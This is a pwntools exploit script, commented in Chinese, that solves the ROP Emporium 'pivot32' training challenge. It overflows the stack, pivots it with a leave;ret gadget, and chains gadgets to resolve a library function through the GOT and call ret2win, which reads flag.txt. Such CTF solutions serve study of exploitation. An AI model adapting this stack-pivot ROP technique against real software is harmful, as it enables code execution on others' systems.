from pwn import *
context.log_level = 'debug'
# sh = process("./pivot32")
sh = gdb.debug("./pivot32")
elf = ELF("./pivot32")
libp = ELF("./libpivot32.so")

# libpivot32.so -> ret2win (system("/bin/cat flag.txt"))
# libpivot32.so -> foothold_function

# 栈迁移指令
leave_ret = 0x0804889f # leave ; ret  -> pivot
# 获取可用栈地址
# use_stack = int(sh.recv().split()[20], 16)
sh.recvuntil('pivot: ')
use_stack = int(sh.recv(10),16)  # 0xaddraddr = 10
# use_stack = u32(sh.recv(8))
print(hex(use_stack))
# sh.recvuntil('> ')


# 构造命令获取ret2win的got值
foo_plt = elf.plt['foothold_function']
foo_got = elf.got['foothold_function']

libp_foo = libp.symbols['foothold_function']
libp_ret2win = libp.symbols['ret2win']
offset = int(libp_ret2win - libp_foo)

mov_eax_eax = 0x080488c4 # mov eax, dword ptr [eax] ; ret
pop_eax = 0x080488c0 # pop eax ; ret
pop_ebx = 0x08048571 # pop ebx ; ret
add_eax_ebx = 0x080488c7 # add eax, ebx ; ret
call_eax = 0x080486a3 # call eax

payload1 = p32(foo_plt) # 调用foo函数,让他找到got表的地址
payload1 += p32(pop_eax) + p32(foo_got)  # 把got表里的地址(函数引用地址&fun)放到eax
payload1 += p32(mov_eax_eax)   # eax里got表里的地址里的值(fun code addr)放到eax里
payload1 += p32(pop_ebx) + p32(offset)      
payload1 += p32(add_eax_ebx) # eax = ret2win = fun code addr + offset
payload1 += p32(call_eax)   # 调用ret2win


sh.sendline(payload1)
# 迁移栈
payload2 = b'a' * 0x28  # 从ebp开始溢出,不是从return address开始溢出
payload2 += p32(use_stack-4) + p32(leave_ret)
sh.sendline(payload2)
sh.recvall()


